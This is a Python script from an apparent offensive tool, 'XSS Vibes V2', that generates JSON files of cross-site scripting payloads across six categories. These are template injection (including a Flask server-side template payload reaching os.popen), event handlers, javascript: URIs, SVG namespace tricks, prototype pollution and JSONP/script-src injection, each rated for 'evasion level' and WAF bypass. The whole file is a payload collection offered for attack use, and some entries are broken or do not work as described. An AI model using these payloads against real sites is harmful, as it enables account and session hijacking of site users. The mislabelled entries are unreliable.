#!/usr/bin/env python3
"""
XSS Vibes V2 - Advanced XSS Categories Creator
Creates god-tier advanced XSS payload categories
"""

import json
import os
from pathlib import Path


def create_template_injection():
    """Template Injection payloads - SSTI leading to XSS"""
    return {
        "category": "template_injection",
        "description": "Server-Side and Client-Side Template Injection leading to XSS",
        "difficulty": "god_tier_advanced",
        "payloads": [
            {
                "name": "mustache_constructor_chain",
                "payload": "{{constructor.constructor('alert(1)')()}}",
                "description": "Mustache/Handlebars constructor chain execution",
                "context": ["mustache", "handlebars", "template_engine"],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": ["template_filters", "constructor_detection"],
            },
            {
                "name": "angular_expression_injection",
                "payload": "{{constructor.constructor('alert(1)')()}}",
                "description": "AngularJS expression injection with constructor chain",
                "context": ["angularjs", "expression", "template"],
                "encoding": "none",
                "evasion_level": 10,
                "waf_bypass": ["angular_sandbox", "expression_filters"],
            },
            {
                "name": "dom_template_import",
                "payload": "<template id=\"tpl\"><img src=x onerror=alert(1)></template><script>document.body.appendChild(document.importNode(document.querySelector('#tpl').content, true));</script>",
                "description": "DOM template rendering with importNode exploitation",
                "context": ["dom_template", "importNode", "html_template"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["template_detection", "dom_manipulation"],
            },
            {
                "name": "vue_template_injection",
                "payload": "{{$eval.constructor('alert(1)')()}}",
                "description": "Vue.js template injection with $eval",
                "context": ["vuejs", "template", "eval"],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": ["vue_filters", "eval_detection"],
            },
            {
                "name": "underscore_template",
                "payload": "<%- constructor.constructor('alert(1)')() %>",
                "description": "Underscore.js template injection",
                "context": ["underscore", "template", "erb_style"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["erb_filters", "underscore_detection"],
            },
            {
                "name": "pug_template_injection",
                "payload": "#{constructor.constructor('alert(1)')()}",
                "description": "Pug template engine injection",
                "context": ["pug", "jade", "template"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["pug_filters", "jade_detection"],
            },
            {
                "name": "nunjucks_template",
                "payload": "{{constructor.constructor('alert(1)')()}}",
                "description": "Nunjucks template injection",
                "context": ["nunjucks", "template", "jinja_style"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["nunjucks_filters", "jinja_detection"],
            },
            {
                "name": "ssti_python_flask",
                "payload": "{{config.__class__.__init__.__globals__['os'].popen('echo alert(1)').read()}}",
                "description": "Python Flask SSTI leading to XSS",
                "context": ["flask", "jinja2", "python_ssti"],
                "encoding": "none",
                "evasion_level": 10,
                "waf_bypass": ["flask_filters", "python_detection", "ssti_filters"],
            },
        ],
    }


def create_event_handler_injection():
    """Event Handler Injection payloads"""
    return {
        "category": "event_handler_injection",
        "description": "Dynamic event handler injection and manipulation",
        "difficulty": "advanced",
        "payloads": [
            {
                "name": "onclick_injection",
                "payload": "onclick=alert(1)",
                "description": "Basic onclick event handler injection",
                "context": ["onclick", "event_attribute", "html_attribute"],
                "encoding": "none",
                "evasion_level": 5,
                "waf_bypass": ["basic", "attribute_filters"],
            },
            {
                "name": "onmouseover_stealth",
                "payload": "onmouseover=alert(1)//",
                "description": "Stealth onmouseover with comment bypass",
                "context": ["onmouseover", "event_attribute", "comment_bypass"],
                "encoding": "none",
                "evasion_level": 6,
                "waf_bypass": ["comment_filters", "mouseover_detection"],
            },
            {
                "name": "setattribute_abuse",
                "payload": "document.createElement('img').setAttribute('onerror','alert(1)');",
                "description": "setAttribute abuse for dynamic event injection",
                "context": ["setAttribute", "dom_manipulation", "dynamic_events"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["dom_filters", "setAttribute_detection"],
            },
            {
                "name": "addeventlistener_dynamic",
                "payload": "document.body.addEventListener('click', new Function('alert(1)'));",
                "description": "addEventListener with dynamic Function constructor",
                "context": [
                    "addEventListener",
                    "Function_constructor",
                    "dynamic_events",
                ],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": ["function_detection", "event_listener_filters"],
            },
            {
                "name": "event_handler_overwrite",
                "payload": "window.onerror = eval; throw 'alert(1)'",
                "description": "Global event handler overwrite with eval",
                "context": ["onerror", "global_handler", "eval_abuse"],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": ["eval_detection", "error_handler_filters"],
            },
            {
                "name": "onload_window_abuse",
                "payload": "window.addEventListener('load', ()=>eval('alert(1)'));",
                "description": "Window load event with arrow function eval",
                "context": ["onload", "arrow_function", "eval"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["arrow_function_filters", "load_event_detection"],
            },
            {
                "name": "focus_event_injection",
                "payload": "<input onfocus=alert(1) autofocus>",
                "description": "Auto-triggering focus event injection",
                "context": ["onfocus", "autofocus", "auto_trigger"],
                "encoding": "none",
                "evasion_level": 7,
                "waf_bypass": ["focus_detection", "autofocus_filters"],
            },
            {
                "name": "animationend_event",
                "payload": '<div style="animation:a 1s" onanimationend=alert(1)>',
                "description": "CSS animation event handler injection",
                "context": ["onanimationend", "css_animation", "style_attribute"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["animation_filters", "css_event_detection"],
            },
        ],
    }


def create_javascript_uri_injection():
    """JavaScript URI Injection payloads"""
    return {
        "category": "javascript_uri_injection",
        "description": "JavaScript protocol handler abuse and URI injection",
        "difficulty": "advanced",
        "payloads": [
            {
                "name": "href_javascript_basic",
                "payload": '<a href="javascript:alert(1)">Click</a>',
                "description": "Basic javascript: URI in href attribute",
                "context": ["href", "javascript_protocol", "anchor_tag"],
                "encoding": "none",
                "evasion_level": 5,
                "waf_bypass": ["javascript_protocol_filters"],
            },
            {
                "name": "window_location_injection",
                "payload": "window.location='javascript:alert(1)'",
                "description": "window.location javascript protocol injection",
                "context": ["window_location", "javascript_protocol", "navigation"],
                "encoding": "none",
                "evasion_level": 7,
                "waf_bypass": ["location_filters", "protocol_detection"],
            },
            {
                "name": "window_open_injection",
                "payload": "window.open('javascript:alert(1)')",
                "description": "window.open with javascript protocol",
                "context": ["window_open", "javascript_protocol", "popup"],
                "encoding": "none",
                "evasion_level": 7,
                "waf_bypass": ["open_filters", "popup_detection"],
            },
            {
                "name": "javascript_void_bypass",
                "payload": "javascript:void(alert(1))",
                "description": "javascript:void() expression bypass",
                "context": ["javascript_void", "void_operator", "expression"],
                "encoding": "none",
                "evasion_level": 6,
                "waf_bypass": ["void_detection", "expression_filters"],
            },
            {
                "name": "javascript_encoded_uri",
                "payload": "javascript:alert(String.fromCharCode(49))",
                "description": "Encoded javascript URI with String.fromCharCode",
                "context": ["javascript_protocol", "fromCharCode", "encoding"],
                "encoding": "character_encoding",
                "evasion_level": 8,
                "waf_bypass": ["encoding_detection", "fromCharCode_filters"],
            },
            {
                "name": "location_assign_injection",
                "payload": "location.assign('javascript:alert(1)')",
                "description": "location.assign javascript protocol injection",
                "context": ["location_assign", "javascript_protocol", "navigation"],
                "encoding": "none",
                "evasion_level": 7,
                "waf_bypass": ["assign_filters", "navigation_detection"],
            },
            {
                "name": "javascript_expression_chain",
                "payload": "javascript:(function(){alert(1)})();",
                "description": "JavaScript URI with IIFE expression",
                "context": ["javascript_protocol", "iife", "function_expression"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["iife_detection", "function_filters"],
            },
            {
                "name": "data_javascript_hybrid",
                "payload": "<iframe src=\"data:text/html,<script>parent.postMessage('javascript:alert(1)','*')</script>\">",
                "description": "Data URI + postMessage javascript injection",
                "context": ["data_uri", "postMessage", "iframe", "javascript_protocol"],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": [
                    "data_uri_filters",
                    "postMessage_detection",
                    "iframe_filters",
                ],
            },
        ],
    }


def create_innerhtml_svg_namespace():
    """innerHTML SVG Namespace Injection payloads"""
    return {
        "category": "innerhtml_svg_namespace",
        "description": "SVG injection via innerHTML with namespace manipulation",
        "difficulty": "god_tier_advanced",
        "payloads": [
            {
                "name": "svg_script_innerhtml",
                "payload": '<div id="xss"></div><script>document.getElementById("xss").innerHTML = `<svg><script>alert(1)</script>`;</script>',
                "description": "Basic SVG script injection via innerHTML",
                "context": ["innerHTML", "svg", "script_tag", "namespace"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": [
                    "svg_filters",
                    "innerHTML_detection",
                    "script_detection",
                ],
            },
            {
                "name": "svg_foreignobject_namespace",
                "payload": '<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></div></foreignObject></svg>',
                "description": "SVG foreignObject with XHTML namespace injection",
                "context": [
                    "svg",
                    "foreignObject",
                    "xhtml_namespace",
                    "mixed_namespace",
                ],
                "encoding": "none",
                "evasion_level": 10,
                "waf_bypass": [
                    "foreignObject_filters",
                    "namespace_detection",
                    "xhtml_filters",
                ],
            },
            {
                "name": "svg_animatetransform_injection",
                "payload": "<svg><animateTransform onbegin=alert(1)>",
                "description": "SVG animateTransform event handler injection",
                "context": ["svg", "animateTransform", "onbegin", "animation"],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": ["svg_animation_filters", "onbegin_detection"],
            },
            {
                "name": "svg_use_href_injection",
                "payload": '<svg><use href="javascript:alert(1)"/>',
                "description": "SVG use element with javascript href",
                "context": ["svg", "use_element", "href", "javascript_protocol"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["svg_use_filters", "href_detection"],
            },
            {
                "name": "svg_image_onerror",
                "payload": "<svg><image href=x onerror=alert(1)>",
                "description": "SVG image element with onerror handler",
                "context": ["svg", "image_element", "onerror", "error_handler"],
                "encoding": "none",
                "evasion_level": 7,
                "waf_bypass": ["svg_image_filters", "onerror_detection"],
            },
            {
                "name": "svg_innerhtml_mixed_namespace",
                "payload": 'document.body.innerHTML=\'<svg xmlns="http://www.w3.org/2000/svg"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></svg>\';',
                "description": "Mixed namespace SVG+XHTML via innerHTML",
                "context": [
                    "innerHTML",
                    "mixed_namespace",
                    "svg_namespace",
                    "xhtml_namespace",
                ],
                "encoding": "none",
                "evasion_level": 10,
                "waf_bypass": ["mixed_namespace_filters", "innerHTML_svg_detection"],
            },
            {
                "name": "svg_set_element_injection",
                "payload": "<svg><set attributeName=onmouseover to=alert(1)>",
                "description": "SVG set element dynamic attribute injection",
                "context": ["svg", "set_element", "attributeName", "dynamic_attribute"],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": ["svg_set_filters", "attributeName_detection"],
            },
            {
                "name": "svg_mpath_injection",
                "payload": "<svg><mpath onload=alert(1)>",
                "description": "SVG mpath element with onload handler",
                "context": ["svg", "mpath", "onload", "motion_path"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["mpath_filters", "svg_onload_detection"],
            },
        ],
    }


def create_javascript_proto_pollution_xss():
    """JavaScript Prototype Pollution XSS payloads"""
    return {
        "category": "javascript_proto_pollution_xss",
        "description": "Prototype pollution leading to DOM clobbering and XSS",
        "difficulty": "god_tier_advanced",
        "payloads": [
            {
                "name": "proto_onerror_pollution",
                "payload": "__proto__.onerror = alert; throw 1;",
                "description": "Prototype pollution of onerror handler",
                "context": [
                    "__proto__",
                    "onerror",
                    "prototype_pollution",
                    "error_handling",
                ],
                "encoding": "none",
                "evasion_level": 10,
                "waf_bypass": [
                    "proto_detection",
                    "onerror_filters",
                    "pollution_detection",
                ],
            },
            {
                "name": "constructor_prototype_pollution",
                "payload": "constructor.prototype.toString = function(){return 'alert(1)'}; eval({}+'');",
                "description": "Constructor prototype pollution with eval",
                "context": ["constructor", "prototype", "toString", "eval"],
                "encoding": "none",
                "evasion_level": 10,
                "waf_bypass": [
                    "constructor_detection",
                    "prototype_filters",
                    "eval_detection",
                ],
            },
            {
                "name": "object_prototype_valueof",
                "payload": "Object.prototype.valueOf = function(){return 'alert(1)'}; +{};",
                "description": "Object prototype valueOf pollution",
                "context": [
                    "Object_prototype",
                    "valueOf",
                    "type_coercion",
                    "pollution",
                ],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": ["valueOf_detection", "object_prototype_filters"],
            },
            {
                "name": "dom_clobbering_pollution",
                "payload": "<form id=__proto__><input name=onerror value=alert(1)>",
                "description": "DOM clobbering via form proto pollution",
                "context": ["dom_clobbering", "__proto__", "form", "input_pollution"],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": ["dom_clobbering_filters", "form_pollution_detection"],
            },
            {
                "name": "array_prototype_pollution",
                "payload": "Array.prototype.join = function(){return 'alert(1)'}; [].join();",
                "description": "Array prototype join method pollution",
                "context": [
                    "Array_prototype",
                    "join",
                    "method_pollution",
                    "array_methods",
                ],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": ["array_pollution_detection", "join_method_filters"],
            },
            {
                "name": "function_prototype_call_pollution",
                "payload": "Function.prototype.call = function(){alert(1)}; setTimeout('',0);",
                "description": "Function prototype call pollution with setTimeout",
                "context": [
                    "Function_prototype",
                    "call",
                    "setTimeout",
                    "function_pollution",
                ],
                "encoding": "none",
                "evasion_level": 10,
                "waf_bypass": [
                    "function_prototype_filters",
                    "call_pollution_detection",
                ],
            },
            {
                "name": "string_prototype_pollution",
                "payload": "String.prototype.toString = function(){return 'alert(1)'}; eval(''+{});",
                "description": "String prototype toString pollution",
                "context": ["String_prototype", "toString", "string_pollution", "eval"],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": [
                    "string_prototype_filters",
                    "toString_pollution_detection",
                ],
            },
            {
                "name": "global_pollution_window",
                "payload": "window.__proto__.alert = function(x){eval(x)}; alert('1');",
                "description": "Global window prototype pollution",
                "context": [
                    "window",
                    "__proto__",
                    "global_pollution",
                    "function_override",
                ],
                "encoding": "none",
                "evasion_level": 10,
                "waf_bypass": ["window_pollution_detection", "global_proto_filters"],
            },
        ],
    }


def create_url_js_context():
    """URL JavaScript Context Injection payloads"""
    return {
        "category": "url_js_context",
        "description": "Script src constructed from query string and URL context injection",
        "difficulty": "advanced",
        "payloads": [
            {
                "name": "script_src_query_injection",
                "payload": '<script src="/js/lib.js?cb=alert(1)//"></script>',
                "description": "Script src with query parameter injection",
                "context": [
                    "script_src",
                    "query_parameter",
                    "callback",
                    "url_injection",
                ],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["script_src_filters", "query_injection_detection"],
            },
            {
                "name": "jsonp_callback_injection",
                "payload": '<script src="/api/data?callback=alert(1)//"></script>',
                "description": "JSONP callback parameter injection",
                "context": ["jsonp", "callback", "api_endpoint", "parameter_injection"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["jsonp_filters", "callback_detection"],
            },
            {
                "name": "dynamic_script_construction",
                "payload": "var s=document.createElement('script');s.src='/js/lib.js?cb='+encodeURIComponent('alert(1)//');document.body.appendChild(s);",
                "description": "Dynamic script element with URL injection",
                "context": [
                    "createElement",
                    "script",
                    "dynamic_src",
                    "encodeURIComponent",
                ],
                "encoding": "url_encoding",
                "evasion_level": 9,
                "waf_bypass": ["dynamic_script_detection", "createElement_filters"],
            },
            {
                "name": "import_statement_injection",
                "payload": "import('/js/module.js?cb=alert(1)//').then(m=>m.default());",
                "description": "ES6 import statement with URL injection",
                "context": ["import", "es6_modules", "dynamic_import", "url_parameter"],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": [
                    "import_filters",
                    "es6_detection",
                    "dynamic_import_detection",
                ],
            },
            {
                "name": "worker_script_injection",
                "payload": "new Worker('/js/worker.js?cb=alert(1)//'))",
                "description": "Web Worker script injection via URL",
                "context": ["Worker", "web_worker", "worker_script", "url_injection"],
                "encoding": "none",
                "evasion_level": 8,
                "waf_bypass": ["worker_filters", "web_worker_detection"],
            },
            {
                "name": "serviceworker_injection",
                "payload": "navigator.serviceWorker.register('/sw.js?cb=alert(1)//')",
                "description": "Service Worker registration with URL injection",
                "context": [
                    "serviceWorker",
                    "registration",
                    "service_worker",
                    "url_parameter",
                ],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": ["serviceworker_filters", "registration_detection"],
            },
            {
                "name": "link_prefetch_injection",
                "payload": '<link rel=prefetch href="/js/lib.js?cb=alert(1)//">',
                "description": "Link prefetch with URL parameter injection",
                "context": ["link", "prefetch", "href", "resource_hint"],
                "encoding": "none",
                "evasion_level": 7,
                "waf_bypass": ["prefetch_filters", "link_href_detection"],
            },
            {
                "name": "fetch_script_injection",
                "payload": "fetch('/api/script?cb=alert(1)//').then(r=>r.text()).then(eval);",
                "description": "Fetch API with eval of injected script",
                "context": ["fetch", "eval", "text_response", "url_injection"],
                "encoding": "none",
                "evasion_level": 9,
                "waf_bypass": [
                    "fetch_filters",
                    "eval_detection",
                    "response_eval_detection",
                ],
            },
        ],
    }


def main():
    """Create all advanced XSS categories"""

    # Create categories
    categories = {
        "template_injection": create_template_injection(),
        "event_handler_injection": create_event_handler_injection(),
        "javascript_uri_injection": create_javascript_uri_injection(),
        "innerhtml_svg_namespace": create_innerhtml_svg_namespace(),
        "javascript_proto_pollution_xss": create_javascript_proto_pollution_xss(),
        "url_js_context": create_url_js_context(),
    }

    # Create categories directory
    categories_dir = Path("xss_vibes/data/categories")
    categories_dir.mkdir(parents=True, exist_ok=True)

    # Save each category
    for category_name, category_data in categories.items():
        file_path = categories_dir / f"{category_name}.json"
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(category_data, f, indent=2, ensure_ascii=False)
        print(f"✅ Created: {file_path}")

    # Create enhanced payloads file for new categories
    enhanced_payloads_file = Path("xss_vibes/data/payloads_enhanced.json")
    enhanced_data = {
        "metadata": {
            "version": "2.0",
            "created": "2025-07-30",
            "description": "XSS Vibes V2 - Advanced payload categories",
        },
        "categories": list(categories.values()),
    }

    # Save enhanced payloads
    with open(enhanced_payloads_file, "w", encoding="utf-8") as f:
        json.dump(enhanced_data, f, indent=2, ensure_ascii=False)

    print(f"✅ Created enhanced payloads: {enhanced_payloads_file}")

    print(f"\n🔥 Created {len(categories)} advanced XSS categories:")
    for category_name, category_data in categories.items():
        payload_count = len(category_data["payloads"])
        difficulty = category_data["difficulty"]
        print(f"   • {category_name}: {payload_count} payloads ({difficulty})")

    print(f"\n📂 Files created in: {categories_dir}")
    print(f"📋 Enhanced payloads created: {enhanced_payloads_file}")


if __name__ == "__main__":
    main()
